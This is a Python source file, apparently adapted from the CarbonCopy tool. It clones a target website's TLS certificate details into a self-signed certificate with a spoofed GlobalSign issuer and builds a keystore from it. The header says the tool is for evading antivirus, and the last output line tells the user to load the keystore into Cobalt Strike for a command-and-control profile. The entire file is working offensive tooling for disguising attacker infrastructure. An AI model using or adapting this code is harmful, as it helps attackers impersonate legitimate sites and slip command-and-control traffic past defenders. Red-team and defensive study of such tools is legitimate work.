##From: https://github.com/paranoidninja/CarbonCopy
##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus
##Reference : https://gist.github.com/cecilemuller/9492b848eb8fe46d462abeb26656c4f8

import ssl
import os
import uuid
import string
import argparse
import random
import sys

from OpenSSL import crypto
from colorama import Fore

# Use pyOpenSSL to generate a fake cert will cause some strange issues in real world RedOps, that why I use openssl.
def CarbonCopy(host, port):
    if os.path.exists('cert-out') == False:
        os.makedirs('cert-out', exist_ok=True)

    # Openssl command is fine :)
    issuer = '/C=BE/O=GlobalSign nv-sa/CN=GlobalSign RSA OV SSL CA 2018'
    print("[+] Creating Root CA with fake issuer: %s"%issuer)
    os.system('openssl req -x509 -nodes -new -sha256 -days 1024 -newkey rsa:2048 -keyout ./cert-out/RootCA.key -out ./cert-out/RootCA.pem -subj "%s" >/dev/null 2>&1'%issuer)
    os.system('openssl x509 -outform pem -in ./cert-out/RootCA.pem -out ./cert-out/RootCA.crt >/dev/null 2>&1')

    print("[+] Loading public key of %s in Memory..." % host)
    ogcert = ssl.get_server_certificate((host, int(port)))
    x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

    # Creating Keygen
    k = crypto.PKey()
    k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))

    # https://stackoverflow.com/questions/57877935/how-to-convert-an-x509name-object-to-a-string-in-python
    subject = x509.get_subject()
    subject_str = "".join("/{:s}={:s}".format(name.decode(), value.decode()) for name, value in subject.get_components())
    print("[+] Creating self-signed certificate")
    os.system('openssl req -new -nodes -newkey rsa:2048 -keyout ./cert-out/localhost.key -out ./cert-out/localhost.csr -subj "%s" >/dev/null 2>&1'%subject_str)
    
    # Generate domains.ext file
    extensions_Headers = r'''authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names
[alt_names]    
''' 
    # https://stackoverflow.com/questions/49491732/pyopenssl-how-can-i-get-sansubject-alternative-names-list
    ext_count = x509.get_extension_count()
    san = ""
    for i in range(0, ext_count):
        ext = x509.get_extension(i)
        ext_data = ext.__str__()
        if 'subjectAltName' in str(ext.get_short_name()):
            san_list = ext_data.split(', ')
            for i in range(0, len(san_list)):
                san += san_list[i].replace("DNS:","DNS.%s = ")%(i+1) + "\n"
    with open("./cert-out/domains.ext",'w') as f:
        f.write(extensions_Headers + san)
        f.close()
    
    os.system('openssl x509 -req -sha256 -days 1024 -in ./cert-out/localhost.csr -CA ./cert-out/RootCA.pem -CAkey ./cert-out/RootCA.key -CAcreateserial -extfile ./cert-out/domains.ext -out ./cert-out/localhost.crt >/dev/null 2>&1')

    print("[+] Creating P12 certificate")
    passphrase = uuid.uuid4().hex
    print(Fore.RED + "[+] PKCS12 passphrase: %s"%passphrase + Fore.RESET)
    os.system('openssl pkcs12 -export -in ./cert-out/localhost.crt -inkey ./cert-out/localhost.key -out ./cert-out/localhost.p12 -name alias -passout pass:%s'%passphrase)

    print("[+] Creating keystore file")
    
    keystore_PASS = password_Generator()
    print(Fore.RED + "[+] Keystore password: %s"%keystore_PASS + Fore.RESET)
    os.system("keytool -importkeystore -deststorepass %s -destkeypass %s -destkeystore ./cert-out/localhost.store -srckeystore ./cert-out/localhost.p12 -srcstoretype PKCS12 -srcstorepass %s >/dev/null 2>&1"%(keystore_PASS, keystore_PASS, passphrase))

    print(Fore.RED + "[+] Copy ./cert-out/localhost.store into your cobaltstrike directory and use it (Don't forget modify your C2 malleable profile and teamserver)")

    with open('./cert-out/pass.txt', 'w') as f:
        f.write("PKCS12 passphrase: {},\r\nKeystore password: {}".format(passphrase, keystore_PASS))

def password_Generator(length=18):                 
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    num = string.digits
    all = num + lower + upper
    temp = random.sample(all,length)
    password = "".join(temp)
    return password

if __name__ == "__main__":
    parser = argparse.ArgumentParser(add_help = True, description = "Creates self-signed certificates & keystore by specifing https website")

    parser.add_argument('-t', metavar="www.google.com", action="store", help="Target domain")
    parser.add_argument('-p', metavar="443",action="store", default="443" ,help="Taget SSL port, default is 443")

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    CarbonCopy(options.t, options.p)